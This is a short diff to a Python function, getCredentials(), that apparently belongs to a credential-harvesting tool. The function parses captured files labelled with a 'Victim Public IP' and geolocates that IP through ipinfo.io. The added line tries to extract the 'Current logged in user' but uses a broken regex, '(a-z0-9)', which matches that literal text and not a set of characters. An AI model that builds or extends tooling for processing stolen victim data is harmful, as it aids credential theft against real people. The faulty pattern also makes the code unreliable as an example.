@@ -308,6 +308,7 @@ def getCredentials():
             lines = creds.read().rstrip()
             if len(lines) != 0:
                 ip = re.match('Victim Public IP: (.*?)\n', lines).group(1)
+                user = re.match('Current logged in user: (a-z0-9)\n', lines)
                 resp = urlopen('https://ipinfo.io/{0}/json'.format(ip))
                 ipinfo = json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
                 if 'bogon' in ipinfo:
